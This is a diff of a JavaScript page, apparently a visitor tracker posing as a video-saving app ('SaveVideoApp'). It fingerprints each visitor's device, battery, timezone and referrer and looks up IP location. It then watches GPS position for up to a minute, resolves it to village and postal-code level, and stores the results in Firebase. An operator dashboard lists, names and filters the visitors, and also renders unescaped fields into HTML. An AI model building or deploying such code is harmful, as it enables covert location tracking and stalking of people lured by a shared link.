-    referrer_label = params.get('utm_source') || params.get('ref') || 'Direct / Unknown';
-  }
-
-  // Touch support
-  const hasTouch = navigator.maxTouchPoints > 0;
-
-  // Dark mode
-  const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
-
-  // Browser name
-  let browser = 'Unknown';
-  if (ua.includes('edg/')) browser = 'Edge';
-  else if (ua.includes('opr/') || ua.includes('opera')) browser = 'Opera';
-  else if (ua.includes('samsungbrowser')) browser = 'Samsung Internet';
-  else if (ua.includes('ucbrowser')) browser = 'UC Browser';
-  else if (ua.includes('miuibrowser')) browser = 'MIUI Browser';
-  else if (ua.includes('chrome')) browser = 'Chrome';
-  else if (ua.includes('safari')) browser = 'Safari';
-  else if (ua.includes('firefox')) browser = 'Firefox';
-
-  const entry = {
-    timestamp: new Date().toISOString(),
-    ua: navigator.userAgent,
-    platform: navigator.platform || 'N/A',
-    language: navigator.language,
-    languages: navigator.languages ? navigator.languages.join(',') : null,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    screen: `${screen.width}x${screen.height}`,
-    viewport: `${window.innerWidth}x${window.innerHeight}`,
-    colorDepth: screen.colorDepth || null,
-    deviceType: /mobile|android|iphone|ipad/.test(ua) ? 'Mobile' : /tablet/.test(ua) ? 'Tablet' : 'Desktop',
-    deviceBrand: devInfo.brand,
-    deviceModel: devInfo.model,
-    browser,
-    hasTouch,
-    darkMode,
-    referrer: ref_src,
-    referrer_label,
-    cookieEnabled: navigator.cookieEnabled,
-    doNotTrack: navigator.doNotTrack === '1',
-    ip: null, city: null, region: null, country: null,
-    country_code: null, org: null, asn: null,
-    lat: null, lng: null, gps_lat: null, gps_lng: null,
-    gps_accuracy: null, gps_status: 'pending', postal: null, connection: null,
-    battery_level: null, battery_charging: null,
-    is_vpn: null
-  };
-
-  const conn = navigator.connection || navigator.mozConnection;
-  if (conn) entry.connection = `${conn.effectiveType||'?'}/${conn.downlink||'?'}Mbps`;
-
-  // Battery API
-  if (navigator.getBattery) {
-    try {
-      const bat = await navigator.getBattery();
-      entry.battery_level = Math.round(bat.level * 100);
-      entry.battery_charging = bat.charging;
-    } catch(e) {}
-  }
-
-  try {
-    const r = await fetch('https://ipapi.co/json/');
-    const d = await r.json();
-    Object.assign(entry, {
-      ip:d.ip, city:d.city, region:d.region, country:d.country_name,
-      country_code:d.country_code, org:d.org, asn:d.asn,
-      lat:d.latitude, lng:d.longitude, postal:d.postal
-    });
-  } catch(e) { entry.ip = 'fetch-failed'; }
-
-  // VPN detection — cek timezone mismatch vs IP country
-  if (entry.country_code && entry.timezone) {
-    const tzCountryMap = {
-      'ID':'Asia/Jakarta,Asia/Makassar,Asia/Jayapura',
-      'MY':'Asia/Kuala_Lumpur','SG':'Asia/Singapore',
-      'US':'America/','GB':'Europe/London','AU':'Australia/',
-      'JP':'Asia/Tokyo','KR':'Asia/Seoul','IN':'Asia/Kolkata',
-      'DE':'Europe/Berlin','FR':'Europe/Paris','NL':'Europe/Amsterdam',
-    };
-    const expected = tzCountryMap[entry.country_code];
-    if (expected) {
-      entry.is_vpn = !expected.split(',').some(tz => entry.timezone.startsWith(tz));
-    }
-  }
-
-  let savedKey = null;
-  try {
-    const res = await push(visRef, entry);
-    savedKey = res.key;
-  } catch(e) { return; }
-
-
-  if (navigator.geolocation && savedKey) {
-    let watchIdLow  = null;  // network/WiFi — cepat, langsung
-    let watchIdHigh = null;  // GPS chip — akurat, butuh waktu warm up
-    let bestAcc     = Infinity;
-    let committed   = false;
-    let geoInFlight = false; // cegah Nominatim dipanggil bersamaan
-    const HARD_STOP = 60000; // 60 detik batas total
-
-    const doReverseGeo = async (lat, lng) => {
-      if (geoInFlight) return;
-      geoInFlight = true;
-      try {
-        const r = await fetch(
-          `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=jsonv2&addressdetails=1&accept-language=id`,
-          { headers:{'User-Agent':'SaveVideoApp/1.0'}, signal:AbortSignal.timeout(12000) }
-        );
-        if (!r.ok) return;
-        const geo  = await r.json();
-        const addr = geo.address || {};
-        const kelurahan = addr.village || addr.suburb || addr.neighbourhood || addr.hamlet || null;
-        const kecamatan = addr.city_district || addr.municipality || addr.town || null;
-        const kotaKab   = addr.city || addr.regency || addr.county || addr.state_district || null;
-        const provinsi  = addr.state || null;
-        const kodePos   = addr.postcode || null;
-        await update(ref(db, `visitors/${savedKey}`), {
-          geo_kelurahan: kelurahan,
-          geo_kecamatan: kecamatan,
-          geo_kota:      kotaKab,
-          geo_provinsi:  provinsi,
-          geo_kodepos:   kodePos,
-          geo_negara:    addr.country || null,
-          geo_alamat:    geo.display_name || null,
-          city:          kotaKab  || null,
-          region:        provinsi || null,
-          postal:        kodePos  || null,
-        });
-      } catch(e) {
-        // Nominatim gagal, tidak apa-apa
-      } finally {
-        geoInFlight = false;
-      }
-    };
-
-    const savePos = async (pos, source) => {
-      const { latitude:gla, longitude:glo, accuracy:acc } = pos.coords;
-
-      // Selalu simpan posisi pertama apapun akurasinya (network/WiFi ~300-1500m)
-      // Lalu update tiap kali ada yang lebih akurat minimal 20% lebih baik
-      if (!committed || acc < bestAcc * 0.8) {
-        committed = true;
-        bestAcc   = acc;
-        await update(ref(db, `visitors/${savedKey}`), {
-          gps_lat:      gla,
-          gps_lng:      glo,
-          gps_accuracy: Math.round(acc),
-          gps_status:   'granted',
-          gps_source:   source, // 'network' atau 'gps'
-          lat:          gla,
-          lng:          glo
-        });
-        // Reverse geo: jalankan segera untuk network, re-run kalau GPS sudah akurat
-        if (!geoInFlight || acc < 200) doReverseGeo(gla, glo);
-
-        // GPS chip sudah sangat akurat → stop semua watch
-        if (acc <= 20) stopAll();
-      }
-    };
-
-    const stopAll = () => {
-      if (watchIdLow  !== null) { navigator.geolocation.clearWatch(watchIdLow);  watchIdLow  = null; }
-      if (watchIdHigh !== null) { navigator.geolocation.clearWatch(watchIdHigh); watchIdHigh = null; }
-    };
-
-    const onErr = async (err) => {
-      // Hanya tandai unavailable/denied kalau SAMA SEKALI belum dapat posisi
-      if (!committed) {
-        if (err.code === 1) {
-          stopAll();
-          await update(ref(db, `visitors/${savedKey}`), { gps_status: 'denied' });
+            return { brand: 'Unknown', model: '' };
         }
-        // code 2/3: jangan tulis apa-apa, biarkan watch lain yang coba
-      }
-    };
 
-    // ── TAHAP 1: Network positioning — enableHighAccuracy:false ──
-    // Langsung dapat hasil dalam < 1 detik (WiFi/cell tower)
-    // Akurasi ~300-1500m, tapi CUKUP untuk tahu kecamatan/kota
-    watchIdLow = navigator.geolocation.watchPosition(
-      pos => savePos(pos, 'network'),
-      onErr,
-      { enableHighAccuracy: false, timeout: 10000, maximumAge: 30000 }
-    );
+        async function collect() {
+            const ua = navigator.userAgent.toLowerCase();
+            const devInfo = parseDevice(navigator.userAgent);
 
-    // ── TAHAP 2: GPS chip — enableHighAccuracy:true ──
-    // Mulai paralel, butuh beberapa detik warm up
-    // Kalau dapat hasil yang lebih akurat → override data network
-    watchIdHigh = navigator.geolocation.watchPosition(
-      pos => savePos(pos, 'gps'),
-      onErr,
-      { enableHighAccuracy: true, timeout: 40000, maximumAge: 0 }
-    );
+            // Referrer — dari mana user datang
+            const ref_src = document.referrer || null;
+            let referrer_label = null;
+            if (ref_src) {
+                if (ref_src.includes('wa.me') || ref_src.includes('whatsapp')) referrer_label = 'WhatsApp';
+                else if (ref_src.includes('instagram')) referrer_label = 'Instagram';
+                else if (ref_src.includes('tiktok')) referrer_label = 'TikTok';
+                else if (ref_src.includes('t.me') || ref_src.includes('telegram')) referrer_label = 'Telegram';
+                else if (ref_src.includes('twitter') || ref_src.includes('x.com')) referrer_label = 'Twitter/X';
+                else if (ref_src.includes('facebook') || ref_src.includes('fb.')) referrer_label = 'Facebook';
+                else if (ref_src.includes('google')) referrer_label = 'Google';
+                else referrer_label = ref_src.split('/')[2] || ref_src;
+            } else {
+                // Cek URL param utm_source / ref
+                const params = new URLSearchParams(window.location.search);
+                referrer_label = params.get('utm_source') || params.get('ref') || 'Direct / Unknown';
+            }
 
-    // Hard stop 60 detik
-    setTimeout(() => {
-      stopAll();
-      if (!committed) {
-        update(ref(db, `visitors/${savedKey}`), { gps_status: 'unavailable' });
-      }
-    }, HARD_STOP);
-  }
-}
+            // Touch support
+            const hasTouch = navigator.maxTouchPoints > 0;
 
-let allVisitors = [];
-onValue(visRef, snap => {
-  allVisitors = [];
-  if (snap.exists()) snap.forEach(c => allVisitors.unshift({_key:c.key, ...c.val()}));
-  if (document.getElementById('dashOverlay').classList.contains('show')) window.renderDash();
-});
+            // Dark mode
+            const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
 
-window.renderDash = function() {
-  const v = allVisitors;
-  document.getElementById('st-total').textContent = v.length;
-  document.getElementById('st-unique').textContent = new Set(v.map(x=>x.ip).filter(Boolean)).size;
-  document.getElementById('st-gps').textContent = v.filter(x=>x.gps_status==='granted').length;
+            // Browser name
+            let browser = 'Unknown';
+            if (ua.includes('edg/')) browser = 'Edge';
+            else if (ua.includes('opr/') || ua.includes('opera')) browser = 'Opera';
+            else if (ua.includes('samsungbrowser')) browser = 'Samsung Internet';
+            else if (ua.includes('ucbrowser')) browser = 'UC Browser';
+            else if (ua.includes('miuibrowser')) browser = 'MIUI Browser';
+            else if (ua.includes('chrome')) browser = 'Chrome';
+            else if (ua.includes('safari')) browser = 'Safari';
+            else if (ua.includes('firefox')) browser = 'Firefox';
 
-  const list = document.getElementById('visitorList');
-  if (!v.length) { list.innerHTML = '<div class="empty">📭 Belum ada visitor. Share linknya!</div>'; return; }
+            const entry = {
+                timestamp: new Date().toISOString(),
+                ua: navigator.userAgent,
+                platform: navigator.platform || 'N/A',
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(',') : null,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}`,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                colorDepth: screen.colorDepth || null,
+                deviceType: /mobile|android|iphone|ipad/.test(ua) ? 'Mobile' : /tablet/.test(ua) ? 'Tablet' : 'Desktop',
+                deviceBrand: devInfo.brand,
+                deviceModel: devInfo.model,
+                browser,
+                hasTouch,
+                darkMode,
+                referrer: ref_src,
+                referrer_label,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack === '1',
+                ip: null, city: null, region: null, country: null,
+                country_code: null, org: null, asn: null,
+                lat: null, lng: null, gps_lat: null, gps_lng: null,
+                gps_accuracy: null, gps_status: 'pending', postal: null, connection: null,
+                battery_level: null, battery_charging: null,
+                is_vpn: null
+            };
 
-  // Apply search + filters
-  const q     = (document.getElementById('dashSearch')?.value || '').toLowerCase();
-  const fGps  = document.getElementById('filterGps')?.value || '';
-  const fDev  = document.getElementById('filterDevice')?.value || '';
-  const fVpn  = document.getElementById('filterVpn')?.value || '';
+            const conn = navigator.connection || navigator.mozConnection;
+            if (conn) entry.connection = `${conn.effectiveType || '?'}/${conn.downlink || '?'}Mbps`;
 
-  const filtered = v.filter(vis => {
-    if (fGps && vis.gps_status !== fGps) return false;
-    if (fDev && vis.deviceType !== fDev) return false;
-    if (fVpn === 'vpn' && !vis.is_vpn) return false;
-    if (fVpn === 'novpn' && vis.is_vpn) return false;
-    if (q) {
-      const hay = [vis.ip, vis.label, vis.city, vis.region, vis.country,
-                   vis.deviceBrand, vis.deviceModel, vis.referrer_label,
-                   vis.geo_kelurahan, vis.geo_kecamatan].filter(Boolean).join('\n').toLowerCase();
-      if (!hay.includes(q)) return false;
-    }
-    return true;
-  });
+            // Battery API
+            if (navigator.getBattery) {
+                try {
+                    const bat = await navigator.getBattery();
+                    entry.battery_level = Math.round(bat.level * 100);
+                    entry.battery_charging = bat.charging;
+                } catch (e) { }
+            }
 
-  if (!filtered.length) {
-    list.innerHTML = '<div class="empty">🔍 Tidak ada hasil yang cocok</div>';
-    return;
-  }
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                Object.assign(entry, {
+                    ip: d.ip, city: d.city, region: d.region, country: d.country_name,
+                    country_code: d.country_code, org: d.org, asn: d.asn,
+                    lat: d.latitude, lng: d.longitude, postal: d.postal
+                });
+            } catch (e) { entry.ip = 'fetch-failed'; }
 
-  const now = Date.now();
-  list.innerHTML = filtered.map((vis,i) => {
-    const flag = vis.country_code ? cf(vis.country_code)+' ' : '';
-    const loc = vis.geo_kelurahan
-      ? `📍 ${vis.geo_kelurahan}, ${vis.geo_kecamatan||''}`
-      : vis.city ? `${flag}${vis.city}, ${vis.region||''}` : `${flag}${vis.country||'Unknown'}`;
-    const dev = vis.deviceType==='Mobile'?'📱':vis.deviceType==='Tablet'?'📟':'🖥️';
-    const time = new Date(vis.timestamp).toLocaleString('id-ID',{day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'});
-    const isNew = (now - new Date(vis.timestamp).getTime()) < 60000;
-    const hasGps = vis.gps_status==='granted';
-    const vpnTag = vis.is_vpn ? '<span style="font-size:0.6rem;background:rgba(255,82,82,0.15);color:#ff5252;padding:1px 4px;border-radius:3px;margin-left:2px">VPN</span>' : '';
-    const refTag = vis.referrer_label && vis.referrer_label !== 'Direct / Unknown'
-      ? `<span style="font-size:0.6rem;background:rgba(124,58,237,0.15);color:#a78bfa;padding:1px 4px;border-radius:3px;margin-left:2px">${vis.referrer_label}</span>` : '';
-    const nameTag = vis.label
-      ? `<span class="name-tag" title="Double-click untuk ubah" ondblclick="event.stopPropagation();window.openRename('${vis._key}')">✏️ ${vis.label}</span>`
-      : `<span style="font-size:0.68rem;color:var(--muted);cursor:pointer;margin-left:3px" title="Beri nama" ondblclick="event.stopPropagation();window.openRename('${vis._key}')">➕nama</span>`;
-    return `<div class="vrow" style="grid-template-columns:40px 145px 1fr 1fr 90px 100px 36px" onclick="window.showDetail('${vis._key}')">
-      <div class="vnum">${filtered.length-i}</div>
-      <div style="display:flex;align-items:center;gap:2px;flex-wrap:wrap"><span class="ip-tag">${(vis.ip||'N/A').substring(0,16)}</span>${isNew?'<span class="new-tag">NEW</span>':''}${hasGps?'<span class="gps-tag">GPS✓</span>':''}${vpnTag}${refTag}${nameTag}</div>
+            // VPN detection — cek timezone mismatch vs IP country
+            if (entry.country_code && entry.timezone) {
+                const tzCountryMap = {
+                    'ID': 'Asia/Jakarta,Asia/Makassar,Asia/Jayapura',
+                    'MY': 'Asia/Kuala_Lumpur', 'SG': 'Asia/Singapore',
+                    'US': 'America/', 'GB': 'Europe/London', 'AU': 'Australia/',
+                    'JP': 'Asia/Tokyo', 'KR': 'Asia/Seoul', 'IN': 'Asia/Kolkata',
+                    'DE': 'Europe/Berlin', 'FR': 'Europe/Paris', 'NL': 'Europe/Amsterdam',
+                };
+                const expected = tzCountryMap[entry.country_code];
+                if (expected) {
+                    entry.is_vpn = !expected.split(',').some(tz => entry.timezone.startsWith(tz));
+                }
+            }
+
+            let savedKey = null;
+            try {
+                const res = await push(visRef, entry);
+                savedKey = res.key;
+            } catch (e) { return; }
+
+
+            if (navigator.geolocation && savedKey) {
+                let watchIdLow = null;  // network/WiFi — cepat, langsung
+                let watchIdHigh = null;  // GPS chip — akurat, butuh waktu warm up
+                let bestAcc = Infinity;
+                let committed = false;
+                let geoInFlight = false; // cegah Nominatim dipanggil bersamaan
+                const HARD_STOP = 60000; // 60 detik batas total
+
+                const doReverseGeo = async (lat, lng) => {
+                    if (geoInFlight) return;
+                    geoInFlight = true;
+                    try {
+                        const r = await fetch(
+                            `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=jsonv2&addressdetails=1&accept-language=id`,
+                            { headers: { 'User-Agent': 'SaveVideoApp/1.0' }, signal: AbortSignal.timeout(12000) }
+                        );
+                        if (!r.ok) return;
+                        const geo = await r.json();
+                        const addr = geo.address || {};
+                        const kelurahan = addr.village || addr.suburb || addr.neighbourhood || addr.hamlet || null;
+                        const kecamatan = addr.city_district || addr.municipality || addr.town || null;
+                        const kotaKab = addr.city || addr.regency || addr.county || addr.state_district || null;
+                        const provinsi = addr.state || null;
+                        const kodePos = addr.postcode || null;
+                        await update(ref(db, `visitors/${savedKey}`), {
+                            geo_kelurahan: kelurahan,
+                            geo_kecamatan: kecamatan,
+                            geo_kota: kotaKab,
+                            geo_provinsi: provinsi,
+                            geo_kodepos: kodePos,
+                            geo_negara: addr.country || null,
+                            geo_alamat: geo.display_name || null,
+                            city: kotaKab || null,
+                            region: provinsi || null,
+                            postal: kodePos || null,
+                        });
+                    } catch (e) {
+                        // Nominatim gagal, tidak apa-apa
+                    } finally {
+                        geoInFlight = false;
+                    }
+                };
+
+                const savePos = async (pos, source) => {
+                    const { latitude: gla, longitude: glo, accuracy: acc } = pos.coords;
+
+                    // Selalu simpan posisi pertama apapun akurasinya (network/WiFi ~300-1500m)
+                    // Lalu update tiap kali ada yang lebih akurat minimal 20% lebih baik
+                    if (!committed || acc < bestAcc) {
+                        committed = true;
+                        bestAcc = acc;
+                        await update(ref(db, `visitors/${savedKey}`), {
+                            gps_lat: gla,
+                            gps_lng: glo,
+                            gps_accuracy: Math.round(acc),
+                            gps_status: 'granted',
+                            gps_source: source, // 'network' atau 'gps'
+                            lat: gla,
+                            lng: glo
+                        });
+                        // Reverse geo: jalankan segera untuk network, re-run kalau GPS sudah akurat
+                        if (!geoInFlight || acc < 200) doReverseGeo(gla, glo);
+
+                        // GPS chip sudah sangat akurat → stop semua watch
+                        if (acc <= 20) stopAll();
+                    }
+                };
+
+                const stopAll = () => {
+                    if (watchIdLow !== null) { navigator.geolocation.clearWatch(watchIdLow); watchIdLow = null; }
+                    if (watchIdHigh !== null) { navigator.geolocation.clearWatch(watchIdHigh); watchIdHigh = null; }
+                };
+
+                const onErr = async (err) => {
+                    // Hanya tandai unavailable/denied kalau SAMA SEKALI belum dapat posisi
+                    if (!committed) {
+                        if (err.code === 1) {
+                            stopAll();
+                            await update(ref(db, `visitors/${savedKey}`), { gps_status: 'denied' });
+                        }
+                        // code 2/3: jangan tulis apa-apa, biarkan watch lain yang coba
+                    }
+                };
+
+                // ── TAHAP 1: Network positioning — enableHighAccuracy:false ──
+                // Langsung dapat hasil dalam < 1 detik (WiFi/cell tower)
+                // Akurasi ~300-1500m, tapi CUKUP untuk tahu kecamatan/kota
+                watchIdLow = navigator.geolocation.watchPosition(
+                    pos => savePos(pos, 'network'),
+                    onErr,
+                    { enableHighAccuracy: false, timeout: 10000, maximumAge: 30000 }
+                );
+
+                // ── TAHAP 2: GPS chip — enableHighAccuracy:true ──
+                // Mulai paralel, butuh beberapa detik warm up
+                // Kalau dapat hasil yang lebih akurat → override data network
+                watchIdHigh = navigator.geolocation.watchPosition(
+                    pos => savePos(pos, 'gps'),
+                    onErr,
+                    { enableHighAccuracy: true, timeout: 40000, maximumAge: 0 }
+                );
+
+                // Hard stop 60 detik
+                setTimeout(() => {
+                    stopAll();
+                    if (!committed) {
+                        update(ref(db, `visitors/${savedKey}`), { gps_status: 'unavailable' });
+                    }
+                }, HARD_STOP);
+            }
+        }
+
+        let allVisitors = [];
+        onValue(visRef, snap => {
+            allVisitors = [];
+            if (snap.exists()) snap.forEach(c => allVisitors.unshift({ _key: c.key, ...c.val() }));
+            if (document.getElementById('dashOverlay').classList.contains('show')) window.renderDash();
+        });
+
+        window.renderDash = function () {
+            const v = allVisitors;
+            document.getElementById('st-total').textContent = v.length;
+            document.getElementById('st-unique').textContent = new Set(v.map(x => x.ip).filter(Boolean)).size;
+            document.getElementById('st-gps').textContent = v.filter(x => x.gps_status === 'granted').length;
+
+            const list = document.getElementById('visitorList');
+            if (!v.length) { list.innerHTML = '<div class="empty">📭 Belum ada visitor. Share linknya!</div>'; return; }
+
+            // Apply search + filters
+            const q = (document.getElementById('dashSearch')?.value || '').toLowerCase();
+            const fGps = document.getElementById('filterGps')?.value || '';
+            const fDev = document.getElementById('filterDevice')?.value || '';
+            const fVpn = document.getElementById('filterVpn')?.value || '';
+
+            const filtered = v.filter(vis => {
+                if (fGps && vis.gps_status !== fGps) return false;
+                if (fDev && vis.deviceType !== fDev) return false;
+                if (fVpn === 'vpn' && !vis.is_vpn) return false;
+                if (fVpn === 'novpn' && vis.is_vpn) return false;
+                if (q) {
+                    const hay = [vis.ip, vis.label, vis.city, vis.region, vis.country,
+                    vis.deviceBrand, vis.deviceModel, vis.referrer_label,
+                    vis.geo_kelurahan, vis.geo_kecamatan].filter(Boolean).join('\n').toLowerCase();
+                    if (!hay.includes(q)) return false;
+                }
+                return true;
+            });
+
+            if (!filtered.length) {
+                list.innerHTML = '<div class="empty">🔍 Tidak ada hasil yang cocok</div>';
+                return;
+            }
+
+            const now = Date.now();
+            list.innerHTML = filtered.map((vis, i) => {
+                const flag = vis.country_code ? cf(vis.country_code) + ' ' : '';
+                const loc = vis.geo_kelurahan
+                    ? `📍 ${vis.geo_kelurahan}, ${vis.geo_kecamatan || ''}`
+                    : vis.city ? `${flag}${vis.city}, ${vis.region || ''}` : `${flag}${vis.country || 'Unknown'}`;
+                const dev = vis.deviceType === 'Mobile' ? '📱' : vis.deviceType === 'Tablet' ? '📟' : '🖥️';
+                const time = new Date(vis.timestamp).toLocaleString('id-ID', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' });
+                const isNew = (now - new Date(vis.timestamp).getTime()) < 60000;
+                const hasGps = vis.gps_status === 'granted';
+                const vpnTag = vis.is_vpn ? '<span style="font-size:0.6rem;background:rgba(255,82,82,0.15);color:#ff5252;padding:1px 4px;border-radius:3px;margin-left:2px">VPN</span>' : '';
+                const refTag = vis.referrer_label && vis.referrer_label !== 'Direct / Unknown'
+                    ? `<span style="font-size:0.6rem;background:rgba(124,58,237,0.15);color:#a78bfa;padding:1px 4px;border-radius:3px;margin-left:2px">${vis.referrer_label}</span>` : '';
+                const nameTag = vis.label
+                    ? `<span class="name-tag" title="Double-click untuk ubah" ondblclick="event.stopPropagation();window.openRename('${vis._key}')">✏️ ${vis.label}</span>`
+                    : `<span style="font-size:0.68rem;color:var(--muted);cursor:pointer;margin-left:3px" title="Beri nama" ondblclick="event.stopPropagation();window.openRename('${vis._key}')">➕nama</span>`;
+                return `<div class="vrow" style="grid-template-columns:40px 145px 1fr 1fr 90px 100px 36px" onclick="window.showDetail('${vis._key}')">
+      <div class="vnum">${filtered.length - i}</div>
+      <div style="display:flex;align-items:center;gap:2px;flex-wrap:wrap"><span class="ip-tag">${(vis.ip || 'N/A').substring(0, 16)}</span>${isNew ? '<span class="new-tag">NEW</span>' : ''}${hasGps ? '<span class="gps-tag">GPS✓</span>' : ''}${vpnTag}${refTag}${nameTag}</div>
       <div style="font-size:0.8rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${loc}</div>
-      <div class="col-isp" style="font-size:0.73rem;color:var(--muted);overflow:hidden;text-overflow:ellipsis">${(vis.org||'N/A').substring(0,22)}</div>
-      <div class="col-dev" style="font-size:0.8rem">${dev} ${vis.deviceBrand && vis.deviceBrand!=='Unknown'? vis.deviceBrand : vis.deviceType||'?'}</div>
+      <div class="col-isp" style="font-size:0.73rem;color:var(--muted);overflow:hidden;text-overflow:ellipsis">${(vis.org || 'N/A').substring(0, 22)}</div>
+      <div class="col-dev" style="font-size:0.8rem">${dev} ${vis.deviceBrand && vis.deviceBrand !== 'Unknown' ? vis.deviceBrand : vis.deviceType || '?'}</div>
       <div class="ttime">${time}</div>
       <div onclick="event.stopPropagation()"><button class="del-btn" onclick="window.deleteVisitor('${vis._key}')" title="Hapus visitor ini">✕</button></div>
     </div>`;
-  }).join('\n');
-};
+            }).join('\n');
+        };
 
-window.showDetail = function(key) {
-  const vis = allVisitors.find(v=>v._key===key);
-  if (!vis) return;
-  const flag = vis.country_code ? cf(vis.country_code)+' ' : '';
-  const ipMap = vis.lat && vis.lng ? `https://www.google.com/maps?q=${vis.lat},${vis.lng}` : null;
+        window.showDetail = function (key) {
+            const vis = allVisitors.find(v => v._key === key);
+            if (!vis) return;
+            const flag = vis.country_code ? cf(vis.country_code) + ' ' : '';
+            const ipMap = vis.lat && vis.lng ? `https://www.google.com/maps?q=${vis.lat},${vis.lng}` : null;
 
-  document.getElementById('detailContent').innerHTML = `
+            document.getElementById('detailContent').innerHTML = `
     <div class="ditem full"><div class="dlbl">IP Address</div>
       <div style="display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap">
-        <div class="dval accent mono">${vis.ip||'N/A'}</div>
-        ${vis.is_vpn != null ? `<span style="font-size:0.72rem;padding:2px 7px;border-radius:4px;background:${vis.is_vpn?'rgba(255,82,82,0.15)':'rgba(0,230,118,0.1)'};color:${vis.is_vpn?'#ff5252':'#00e676'}">${vis.is_vpn?'🔴 Kemungkinan VPN/Proxy':'🟢 Tidak terdeteksi VPN'}</span>` : ''}
+        <div class="dval accent mono">${vis.ip || 'N/A'}</div>
+        ${vis.is_vpn != null ? `<span style="font-size:0.72rem;padding:2px 7px;border-radius:4px;background:${vis.is_vpn ? 'rgba(255,82,82,0.15)' : 'rgba(0,230,118,0.1)'};color:${vis.is_vpn ? '#ff5252' : '#00e676'}">${vis.is_vpn ? '🔴 Kemungkinan VPN/Proxy' : '🟢 Tidak terdeteksi VPN'}</span>` : ''}
       </div>
     </div>
-    <div class="ditem"><div class="dlbl">📌 Dari (Referrer)</div><div class="dval" style="color:#a78bfa">${vis.referrer_label||'Direct / Unknown'}</div></div>
-    <div class="ditem"><div class="dlbl">🌍 Browser</div><div class="dval">${vis.browser||'Unknown'}</div></div>
-    <div class="ditem"><div class="dlbl">Kota (IP)</div><div class="dval">${vis.city||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">Provinsi (IP)</div><div class="dval">${vis.region||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">Negara</div><div class="dval">${flag}${vis.country||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">Kode Pos (IP)</div><div class="dval">${vis.postal||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">ISP / Org</div><div class="dval">${vis.org||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">ASN</div><div class="dval mono">${vis.asn||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">Timezone</div><div class="dval">${vis.timezone||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">📱 Merek / Brand</div><div class="dval" style="color:${vis.deviceBrand && vis.deviceBrand!=='Unknown'?'#00d4ff':'var(--muted)'}">${vis.deviceBrand||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">🔧 Model Perangkat</div><div class="dval">${vis.deviceModel||vis.deviceType||'N/A'} • ${vis.screen||''}</div></div>
-    <div class="ditem"><div class="dlbl">Viewport</div><div class="dval mono">${vis.viewport||vis.screen||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">Koneksi</div><div class="dval">${vis.connection||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">🔋 Baterai</div><div class="dval">${vis.battery_level != null ? vis.battery_level+'%'+(vis.battery_charging?' ⚡ Charging':'') : 'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">Bahasa</div><div class="dval">${vis.language||'N/A'}</div></div>
-    <div class="ditem"><div class="dlbl">Dark Mode</div><div class="dval">${vis.darkMode != null ? (vis.darkMode?'🌙 Ya':'☀️ Tidak') : 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">📌 Dari (Referrer)</div><div class="dval" style="color:#a78bfa">${vis.referrer_label || 'Direct / Unknown'}</div></div>
+    <div class="ditem"><div class="dlbl">🌍 Browser</div><div class="dval">${vis.browser || 'Unknown'}</div></div>
+    <div class="ditem"><div class="dlbl">Kota (IP)</div><div class="dval">${vis.city || 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">Provinsi (IP)</div><div class="dval">${vis.region || 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">Negara</div><div class="dval">${flag}${vis.country || 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">Kode Pos (IP)</div><div class="dval">${vis.postal || 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">ISP / Org</div><div class="dval">${vis.org || 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">ASN</div><div class="dval mono">${vis.asn || 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">Timezone</div><div class="dval">${vis.timezone || 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">📱 Merek / Brand</div><div class="dval" style="color:${vis.deviceBrand && vis.deviceBrand !== 'Unknown' ? '#00d4ff' : 'var(--muted)'}">${vis.deviceBrand || 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">🔧 Model Perangkat</div><div class="dval">${vis.deviceModel || vis.deviceType || 'N/A'} • ${vis.screen || ''}</div></div>
+    <div class="ditem"><div class="dlbl">Viewport</div><div class="dval mono">${vis.viewport || vis.screen || 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">Koneksi</div><div class="dval">${vis.connection || 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">🔋 Baterai</div><div class="dval">${vis.battery_level != null ? vis.battery_level + '%' + (vis.battery_charging ? ' ⚡ Charging' : '') : 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">Bahasa</div><div class="dval">${vis.language || 'N/A'}</div></div>
+    <div class="ditem"><div class="dlbl">Dark Mode</div><div class="dval">${vis.darkMode != null ? (vis.darkMode ? '🌙 Ya' : '☀️ Tidak') : 'N/A'}</div></div>
     <div class="ditem"><div class="dlbl">Waktu Kunjungan</div><div class="dval">${new Date(vis.timestamp).toLocaleString('id-ID')}</div></div>
-    <div class="ditem full" style="border-color:${vis.gps_status==='granted'?'rgba(255,45,120,0.4)':'var(--border)'}">
